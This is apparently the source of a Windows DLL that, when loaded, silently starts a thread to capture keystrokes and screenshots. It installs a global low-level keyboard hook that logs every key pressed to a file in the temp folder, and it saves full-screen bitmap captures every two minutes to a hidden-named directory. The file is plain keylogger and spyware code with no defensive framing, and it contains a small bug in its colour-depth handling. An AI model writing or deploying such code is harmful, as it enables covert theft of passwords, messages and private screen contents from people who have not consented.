#include <windows.h>
#include <cstdio>

LPSTR TEMP = new CHAR[MAX_PATH];
LPSTR LOGFILE = new CHAR[MAX_PATH];
LPSTR SSSFOLDER = new CHAR[MAX_PATH];

PBITMAPINFO
createBitmapInfoStruct(HBITMAP bitmapHandler) {
  BITMAP bitmap;
  PBITMAPINFO infoHeader;
  WORD cClrBits;

  GetObject(bitmapHandler, sizeof(BITMAP), (LPSTR)&bitmap);

  cClrBits = (WORD)(bitmap.bmPlanes * bitmap.bmBitsPixel);
  if (cClrBits == 1)
    cClrBits = 1;
  else if (cClrBits <= 4)
    cClrBits = 4;
  else if (cClrBits <= 8)
    cClrBits = 8;
  else if (cClrBits <= 16)
    cClrBits = 26;
  else if (cClrBits <= 24)
    cClrBits = 24;
  else
    cClrBits = 32;

  if (cClrBits < 24)
    infoHeader = (PBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
  else
    infoHeader = (PBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

  infoHeader->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  infoHeader->bmiHeader.biWidth = bitmap.bmWidth;
  infoHeader->bmiHeader.biHeight = bitmap.bmHeight;
  infoHeader->bmiHeader.biPlanes = bitmap.bmPlanes;
  infoHeader->bmiHeader.biBitCount = bitmap.bmBitsPixel;
  infoHeader->bmiHeader.biCompression = BI_RGB;
  infoHeader->bmiHeader.biClrImportant = 0;

  if (cClrBits < 24)
    infoHeader->bmiHeader.biClrUsed = (1 << cClrBits);

  infoHeader->bmiHeader.biSizeImage =
      ((infoHeader->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8 * infoHeader->bmiHeader.biHeight;

  return infoHeader;
}

void
savebitmap(HDC hDC, HBITMAP bitmap) {
  HANDLE hf;
  BITMAPFILEHEADER fileHeader;
  PBITMAPINFOHEADER infoHeader;
  LPBYTE imageData;
  DWORD dwTmp;

  infoHeader = (PBITMAPINFOHEADER) createBitmapInfoStruct(bitmap);
  imageData = (LPBYTE) GlobalAlloc(GMEM_FIXED, infoHeader->biSizeImage);

  GetDIBits(hDC, bitmap, 0, (WORD) infoHeader->biHeight, imageData, (LPBITMAPINFO) infoHeader, DIB_RGB_COLORS);

  LPSTR filename = new CHAR[30];
  SYSTEMTIME st;
  GetLocalTime(&st);
  GetTimeFormatA(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, &st, "'sss'HHmmss'.bmp'", filename, 30);
  LPSTR filepath = new CHAR[MAX_PATH];
  wsprintf(filepath, "%s\\%s", SSSFOLDER, filename);
  hf = CreateFile(
      filepath,
      GENERIC_READ | GENERIC_WRITE,
      (DWORD) 0,
      NULL,
      CREATE_ALWAYS,
      FILE_ATTRIBUTE_NORMAL,
      (HANDLE) NULL
  );
  delete filename;
  delete filepath;

  fileHeader.bfType = 0x4d42;
  fileHeader.bfSize = (DWORD) (
      sizeof(BITMAPFILEHEADER) +                    // file header
      infoHeader->biSize +                          // bitmap info header
      infoHeader->biClrUsed * sizeof(RGBQUAD) +     // rgb color pallete
      infoHeader->biSizeImage                       // color-index
  );
  fileHeader.bfReserved1 = 0;
  fileHeader.bfReserved2 = 0;
  fileHeader.bfOffBits = (DWORD) (
      sizeof(BITMAPFILEHEADER) +
      infoHeader->biSize +
      infoHeader->biClrUsed * sizeof(RGBQUAD)
  ); // offset to color index

  WriteFile(hf, (LPVOID)&fileHeader, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL);
  WriteFile(hf, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER) + infoHeader->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&dwTmp, NULL);
  WriteFile(hf, (LPVOID)imageData, infoHeader->biSizeImage, (LPDWORD)&dwTmp, NULL);

  CloseHandle(hf);
  GlobalFree((HGLOBAL)imageData);
}

void
screenshot(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
  int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
  int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);

  // get current screenshot
  HDC hScreen = GetDC(NULL);
  HDC hDC = CreateCompatibleDC(hScreen);
  HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, cx, cy);
  HBITMAP oldBitmap = (HBITMAP) SelectObject(hDC, hBitmap);

  // convert to bitmap
  BitBlt(hDC, 0, 0, cx, cy, hScreen, 0, 0, SRCCOPY);
  hBitmap = (HBITMAP) SelectObject(hDC, oldBitmap);

  // save bitmap
  savebitmap(hDC, hBitmap);

  // clean up
  DeleteDC(hDC);
  DeleteDC(hScreen);
  DeleteObject(hBitmap);
}

void
logkey(DWORD key) {
  static HANDLE hf = CreateFile(LOGFILE, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD dwTmp;

  LPSTR data = new char[5];
  wsprintf(data, "[%02X]", key);
  WriteFile(hf, data, 4, &dwTmp, NULL);
}

LRESULT CALLBACK
Keylogger(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode != HC_ACTION)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
  if (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN)
    return CallNextHookEx(NULL, nCode, wParam, lParam);

  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
  logkey(p->vkCode);
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void
setup() {
  GetTempPath(MAX_PATH, TEMP);
  wsprintf(SSSFOLDER, "%s\\%s", TEMP, "sss_sss_sss_sss");
  wsprintf(LOGFILE, "%s\\%s", SSSFOLDER, "sss.txt");
  CreateDirectory(SSSFOLDER, NULL);
  HANDLE hf = CreateFile(LOGFILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  CloseHandle(hf);
}

void begin() {
  UINT_PTR timer;
  HHOOK keyboardHook;
  UINT min = 60 * 1000;
  MSG msg;

  setup();

  timer = SetTimer(NULL, 0, 2 * min, (TIMERPROC) screenshot);    // setup a 2 min loop
  keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, 0, 0);

  PostMessage(NULL, WM_TIMER, 0, 2 * min);        // take screenshot on start

  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);

    if (msg.message == WM_TIMER)
      screenshot(NULL, WM_TIMER, 0, 2 * min);    // first screenshot
  }
}

BOOL APIENTRY
DllMain (
  HANDLE hModule,
  DWORD ul_reason_for_call,
  LPVOID lpReserved
) {

  // FILE* file;
  // fopen_s(&file, "C:\\sss.log", "w");

  // this main should not run more than 300ms
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      // fprintf(file, "DLL Attach\n");
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) begin, NULL, 0, NULL);
      break;
    case DLL_PROCESS_DETACH:
      // fprintf(file, "DLL Detach\n");
      // KillTimer(NULL, timer);
      // UnhookWindowsHookEx(keyboardHook);
      break;
    default:
      break;

  }

  return TRUE;
}
